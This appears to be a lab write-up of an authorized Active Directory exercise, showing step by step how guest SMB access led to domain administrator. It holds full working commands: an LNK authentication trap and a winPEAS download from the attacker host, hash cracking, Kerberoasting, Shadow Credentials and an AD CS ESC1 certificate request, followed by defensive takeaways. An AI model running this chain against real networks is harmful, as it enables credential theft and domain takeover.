---
title: 'Orion: From Guest SMB Access to Domain Compromise'
description: 'An easy HackSmarter Active Directory lab chaining a writable SMB share, Kerberoasting, delegated permissions, Shadow Credentials, exposed secrets, and AD CS ESC1.'
pubDate: '2026-11-12'
heroImage: '/images/orion/onion.png'
category: 'Active Directory'
difficulty: 'Easy'
---

Orion is an easy Active Directory lab from HackSmarter. Starting without domain credentials, I worked from a guest-accessible SMB share on an IT workstation to an Administrator session on the domain controller.

The path connected several weaknesses: a writable upload share, weak passwords, excessive delegated permissions, credentials left in PowerShell history and scripts, and a certificate template vulnerable to ESC1. Each finding provided the access needed to investigate the next one.

> This writeup documents an authorized lab. IP addresses, accounts, and credentials below belong to that environment. Long hashes and repetitive terminal output have been shortened; the final flag is omitted.

## Lab overview

| Item | Details |
| --- | --- |
| Platform | HackSmarter |
| Difficulty | Easy |
| Category | Active Directory |
| Domain | `orion.local` |
| Workstation | `WS-IT.orion.local` — `10.0.0.6` |
| Domain controller | `DC01.orion.local` — `10.0.0.5` |
| Attacker address used during the lab | `192.168.211.2` |
| Result | Administrator access to the domain controller |

### Attack path

| Step | Finding | Access gained |
| --- | --- | --- |
| 1 | Guest could write to the `Uploads` SMB share | A place to upload an authentication-triggering shortcut |
| 2 | The shortcut triggered an SMB connection to Responder | Crackable NetNTLMv2 response for `b.williams` |
| 3 | `svc-onboarding` had a roastable service ticket and a weak password | Credentials for the onboarding service account |
| 4 | Delegated password-reset permission over `s.mitchell` | Control of `s.mitchell` |
| 5 | `s.mitchell` had `GenericWrite` over `m.white` | Shadow Credentials authentication as `m.white` |
| 6 | PowerShell history exposed `m.reeves` credentials | Access to the workstation's IT share |
| 7 | `Publish-CRL.ps1` contained `svc-pki` credentials | An account allowed to enroll in `OrionAuth` |
| 8 | `OrionAuth` was vulnerable to ESC1 | Administrator certificate, NT hash, and WinRM session |

## 1. Enumerating the IT workstation

I began by scanning the workstation:

```bash
rustscan -a 10.0.0.6 -- -A
```

The relevant results were:

```text
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  http
49672/tcp open  msrpc
49684/tcp open  msrpc
```

RDP information identified the host as `WS-IT.orion.local` in the `ORION` domain. SMB signing was enabled and required. The exposed services gave me two useful directions: SMB for initial enumeration and WinRM as a possible remote access method once I obtained a suitable account.

The RDP certificate also contained `WS-IT.orion.local`. That helped confirm the hostname; it did not establish an AD CS vulnerability.

### Testing anonymous and guest access

```bash
nxc smb WS-IT.orion.local -u '' -p ''
nxc smb WS-IT.orion.local -u 'guest' -p ''
```

Anonymous authentication failed, while the guest login succeeded:

```text
[-] orion.local\: STATUS_ACCESS_DENIED
[+] orion.local\guest:
```

Share enumeration with NetExec timed out, including after increasing its timeout. Samba's `smbclient` returned a logon failure. Impacket's SMB client worked with the following target syntax:

```bash
impacket-smbclient WS-IT.orion.local/guest@10.0.0.6 -no-pass
```

Inside the client:

```text
shares
use Uploads
ls
cat README.txt
```

The share list included `Company`, `IT`, and `Uploads`. A README in `Uploads` explained that staff could drop files there and that IT collected and processed them daily.

This suggested that another user or process might interact with uploaded files. The later shortcut upload confirmed that guest had write access to this share.

## 2. Capturing authentication through the writable share

I started Responder on the VPN interface:

```bash
sudo responder -I tun0 -dwv
```

Then I used NetExec's `slinky` module to place a shortcut in `Uploads`, pointing back to the attacker address:

```bash
nxc smb WS-IT.orion.local -u 'guest' -p '' \
  -M slinky \
  -o SERVER=192.168.211.2 NAME=cor-1337.lnk SHARES=Uploads \
  --smb-timeout 60
```

The module confirmed the upload:

```text
Uploads         READ,WRITE      Public Upload Share
[+] Found writable share: Uploads
[+] Created LNK file on the Uploads share
```

Responder subsequently captured an authentication attempt from the workstation:

```text
[SMB] NTLMv2-SSP Client   : 10.0.0.6
[SMB] NTLMv2-SSP Username : ORION\b.williams
[SMB] NTLMv2-SSP Hash     : [NetNTLMv2 response omitted]
```

The important result was an outbound SMB authentication attempt as `b.williams`. The transcript does not identify the exact process that accessed the shortcut.

### Recovering the first domain password

I saved the captured response to `bwilliam.hash` and ran Hashcat:

```bash
hashcat bwilliam.hash /usr/share/wordlists/rockyou.txt
```

The recovered credentials were:

```text
b.williams : williams123
```

I validated them against the workstation:

```bash
nxc smb WS-IT.orion.local -u 'b.williams' -p 'williams123'
```

```text
[+] orion.local\b.williams:williams123
```

This capture was a NetNTLMv2 challenge-response, rather than the user's reusable NT hash. Cracking it recovered the password used for subsequent enumeration. No SMB relay was needed for this path.

## 3. Mapping the domain and finding a roastable account

With a valid domain account, I collected BloodHound data using bloodyAD:

```bash
bloodyad -H DC01.orion.local -d orion.local \
  -u 'b.williams' -p 'williams123' get bloodhound
```

The collection returned users, groups, computers, and security descriptors. I imported the resulting archive into BloodHound to examine delegated permissions.

I also exported the domain user list:

```bash
nxc smb DC01.orion.local -u 'b.williams' -p 'williams123' \
  --users-export users.txt --smb-timeout 60
```

A password-reuse check did not identify another account using `williams123`:

```bash
nxc smb DC01.orion.local -u users.txt -p 'williams123' \
  --smb-timeout 60 --continue-on-success
```

### Kerberoasting svc-onboarding

Next, I requested roastable service tickets:

```bash
nxc ldap 10.0.0.5 -u 'b.williams' -p 'williams123' \
  --kerberoasting hashes.txt
```

The output identified `svc-onboarding`, a member of `Helpdesk Operators`, and returned an RC4 service-ticket hash:

```text
sAMAccountName: svc-onboarding
memberOf: CN=Helpdesk Operators,OU=Orion,DC=orion,DC=local
$krb5tgs$23$*svc-onboarding$ORION.LOCAL$[remaining hash omitted]
```

I cracked the saved ticket with Hashcat:

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

```text
svc-onboarding : password2510
```

The account's helpdesk role made its delegated permissions worth investigating.

![BloodHound view used to investigate s.mitchell](/images/orion/s.mit.png)

## 4. Abusing delegated password-reset permissions

BloodHound revealed a password-reset path from the onboarding account to `s.mitchell`.

![BloodHound view of the svc-onboarding permission path](/images/orion/svc.png)

Using `svc-onboarding`, I reset the target account's password:

```bash
bloodyad --host 10.0.0.5 -d orion.local \
  -u 'svc-onboarding' -p 'password2510' \
  set password s.mitchell 'NewPassword@123'
```

```text
[+] Password changed successfully!
```

I then validated the new credentials:

```bash
nxc smb 10.0.0.5 -u 's.mitchell' -p 'NewPassword@123'
```

```text
[+] orion.local\s.mitchell:NewPassword@123
```

This step turned delegated account-management rights into control of another domain identity without knowing its original password.

## 5. Moving to m.white through Shadow Credentials

The next useful relationship was `GenericWrite` from `s.mitchell` to `m.white`. The target account also had a remote-access relationship that made it a promising route to the workstation.

![BloodHound view showing the relationship to m.white](/images/orion/mwhite.png)

### Checking roasting options

I first tried requesting a service ticket for `m.white`:

```bash
impacket-GetUserSPNs -dc-ip 10.0.0.5 \
  'orion.local/s.mitchell:NewPassword@123' \
  -request-user 'm.white' -outputfile targeted_kerberoast.txt
```

```text
No entries found!
```

This command only attempted to request an existing service ticket. It did not add an SPN, so it was not a complete targeted Kerberoasting attempt using `GenericWrite`.

I also checked for AS-REP roasting:

```bash
impacket-GetNPUsers -dc-ip 10.0.0.5 'orion.local/m.white' \
  -no-pass -format hashcat -outputfile targeted_asrep.txt
```

```text
[-] User m.white doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Neither check returned a usable roastable hash. I moved on to Shadow Credentials.

### Adding a key credential

I used the write permission to add a key credential to `m.white`:

```bash
bloodyad -u 's.mitchell' -p 'NewPassword@123' \
  -d orion.local --host 10.0.0.5 \
  add shadowCredentials 'm.white'
```

The output included a PKINIT failure, but also saved a PFX file:

```text
[-] PKINIT failed on DC 10.0.0.5
[+] PKINIT PFX certificate saved at: m.white_Fh.pfx
[+] TGT stored in ccache file m.white_Fh.ccache
```

Because those messages were mixed, I checked the saved certificate explicitly with Certipy:

```bash
certipy-ad auth -username 'm.white' -domain 'orion.local' \
  -dc-ip 10.0.0.5 -pfx 'm.white_Fh.pfx'
```

Certipy displayed certificate identity mismatch prompts. I continued with the intended username and domain, and authentication succeeded:

```text
[*] Using principal: 'm.white@orion.local'
[*] Got TGT
[*] Wrote credential cache to 'm.white.ccache'
[*] Got hash for 'm.white@orion.local':
aad3b435b51404eeaad3b435b51404ee:1b4f4e8d871ad063ffded46cc620bbf6
```

The successful Certipy authentication established that the added key credential was usable in this lab, despite bloodyAD's earlier error.

### Obtaining a workstation shell

I tested WinRM access with the recovered NT hash:

```bash
nxc winrm 10.0.0.6 -u 'm.white' \
  -H '1b4f4e8d871ad063ffded46cc620bbf6'
```

```text
[+] orion.local\m.white:1b4f4e8d871ad063ffded46cc620bbf6 (Pwn3d!)
```

Then I opened a session:

```bash
evil-winrm -i 10.0.0.6 -u 'm.white' \
  -H '1b4f4e8d871ad063ffded46cc620bbf6'
```

The session could access `C:\Users\m.white\Desktop`, where `user.txt` was present. This provided the first interactive foothold on the workstation.

## 6. Finding credentials in PowerShell history

For local enumeration, I hosted winPEAS from Kali:

```bash
python3 -m http.server 80
```

From the WinRM session, I downloaded and ran it:

```powershell
wget http://192.168.211.2/winPEASany.exe -o Winpeas.exe
./Winpeas.exe
```

The output identified a PowerShell history file:

```text
C:\Users\m.white\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

I read the file:

```powershell
Get-Content C:\Users\m.white\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Two recorded commands exposed credentials for `m.reeves`:

```powershell
$cred = New-Object System.Management.Automation.PSCredential('ORION\m.reeves', (ConvertTo-SecureString 'Pa$$word!123' -AsPlainText -Force))
net use Z: \\WS-IT\IT /user:ORION\m.reeves Pa$$word!123
```

I validated the recovered password:

```bash
nxc smb 10.0.0.5 -u 'm.reeves' -p 'Pa$$word!123'
```

```text
[+] orion.local\m.reeves:Pa$$word!123
```

BloodHound showed that `m.reeves` belonged to `WS_IT_Admins`.

![BloodHound view of m.reeves and workstation administration relationships](/images/orion/mreeves.png)

## 7. Recovering the PKI service account from the IT share

I enumerated workstation shares as `m.reeves`:

```bash
nxc smb 10.0.0.6 -u 'm.reeves' -p 'Pa$$word!123' \
  --shares --smb-timeout 60
```

The account could read the `IT` share and had read/write access to the administrative shares:

```text
ADMIN$          READ,WRITE      Remote Admin
C$              READ,WRITE      Default share
IT              READ            IT admins only
```

I connected with Impacket:

```bash
impacket-smbclient 'orion.local/m.reeves:Pa$$word!123@WS-IT.orion.local'
```

The `IT` share contained `Docs`, `Logs`, `Scripts`, and `Tools`. I downloaded the scripts for inspection:

```text
use IT
cd Scripts
ls
mget *
```

The relevant script was `Publish-CRL.ps1`, described as a scheduled PKI maintenance task on `DC01`. It contained a hardcoded service-account password:

```powershell
# Service account credentials used to connect to the CA
$caUser = "ORION\svc-pki"
$caPass = ConvertTo-SecureString 'Pki@Orion2026!' -AsPlainText -Force
```

The exposed credentials were:

```text
svc-pki : Pki@Orion2026!
```

Converting a literal password to a `SecureString` at runtime did not protect the password stored in the script. Anyone able to read this file could recover it.

## 8. Identifying an ESC1-vulnerable certificate template

The BloodHound view showed the PKI account's certificate enrollment context, so I investigated AD CS.

![BloodHound view of svc-pki and certificate enrollment relationships](/images/orion/image.png)

```bash
certipy-ad find -u 'svc-pki' -p 'Pki@Orion2026!' \
  -dc-ip 10.0.0.5 -vulnerable -stdout -target DC01.orion.local
```

Certipy identified the CA `orion-DC01-CA` and flagged the enabled `OrionAuth` template as vulnerable to ESC1.

| Property | Observed value |
| --- | --- |
| Template | `OrionAuth` |
| Certificate authority | `orion-DC01-CA` |
| Client Authentication | Enabled |
| Enrollee Supplies Subject | Enabled |
| Manager approval | Not required |
| Authorized signatures required | `0` |
| Enrollment rights | Included `ORION.LOCAL\svc-pki` |
| Certipy finding | ESC1 |

These settings gave the compromised account a route to request an authentication certificate containing a supplied identity.

Certipy's web-enrollment checks timed out. The later certificate request succeeded over RPC, so the path did not depend on confirming web enrollment.

### The first certificate lacked identity information

My initial request selected the template and CA without supplying a target identity:

```bash
certipy-ad req -u 'svc-pki' -p 'Pki@Orion2026!' \
  -dc-ip 10.0.0.5 -template 'OrionAuth' \
  -ca 'orion-DC01-CA' -timeout 20
```

The CA issued a certificate, but Certipy reported:

```text
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Wrote certificate and private key to 'svc-pki.pfx'
```

Issuance alone did not demonstrate impersonation of Administrator. This request had not included the Administrator identity needed for the next step.

### Requesting a certificate for Administrator

I obtained Administrator's SID from BloodHound and repeated the request with both its UPN and SID:

```bash
certipy-ad -debug req \
  -u 'svc-pki@orion.local' -p 'Pki@Orion2026!' \
  -dc-ip 10.0.0.5 -target 10.0.0.5 \
  -ca 'orion-DC01-CA' -template 'OrionAuth' \
  -upn 'administrator@orion.local' \
  -sid 'S-1-5-21-285037524-3800758587-3641439792-500' \
  -ldap-scheme ldap -timeout 20
```

The output confirmed the requested identity:

```text
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@orion.local'
[+] Found SID in SAN URL: 'S-1-5-21-285037524-3800758587-3641439792-500'
[+] Found SID in security extension: 'S-1-5-21-285037524-3800758587-3641439792-500'
[*] Wrote certificate and private key to 'administrator.pfx'
```

This was the successful request in this environment. The supplied SID is specific to Orion; it should not be treated as a universal value or as proof that any ESC1 template works under every certificate-mapping configuration.

## 9. Authenticating as Administrator

I authenticated using the issued certificate:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain orion.local \
  -dc-ip 10.0.0.5
```

Certipy obtained a TGT and recovered Administrator's NT hash:

```text
[*] Using principal: 'administrator@orion.local'
[*] Got TGT
[*] Wrote credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@orion.local':
aad3b435b51404eeaad3b435b51404ee:54c9fa5ad8849c9414602fe021314d49
```

I used the NT hash to open a WinRM session on the domain controller:

```bash
evil-winrm -i 10.0.0.5 -u administrator \
  -H '54c9fa5ad8849c9414602fe021314d49'
```

```text
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

From this session, I accessed `C:\Users\Administrator\Desktop\root.txt`, completing the lab. The flag value is omitted from this post.

## Defensive takeaways

| Weakness observed | Defensive action |
| --- | --- |
| Guest could upload files that triggered outbound authentication | Restrict guest share access, review file-processing workflows, and limit outbound SMB |
| Captured responses and service tickets yielded weak passwords | Use strong, unique passwords and managed service accounts where supported |
| An onboarding identity could reset another account's password | Review delegated reset rights and scope them to the accounts that require them |
| A user could modify another user's key credentials | Audit `GenericWrite` permissions and changes to `msDS-KeyCredentialLink` |
| PowerShell history exposed an administrator's password | Avoid placing passwords in command arguments or saved interactive commands; rotate exposed credentials |
| A readable maintenance script contained the PKI password | Remove embedded secrets and restrict access to service-account credentials |
| An enrollable authentication template accepted a supplied identity | Review template enrollment rights, subject settings, and approval requirements |

## What I learned

Orion reinforced the value of following permissions and credential exposure as one connected path. The guest share provided the first domain account, BloodHound revealed useful delegated rights, and local enumeration exposed the credentials that led to certificate enrollment.

The troubleshooting steps were equally useful. A failed service-ticket request did not exhaust the options available through `GenericWrite`. An error in one tool did not invalidate a certificate that another tool successfully used. And a successful certificate request was only part of the evidence—the decisive result was authenticating as the intended account.

The lab ended with Administrator access to `DC01`, reached through a chain of individually understandable misconfigurations.
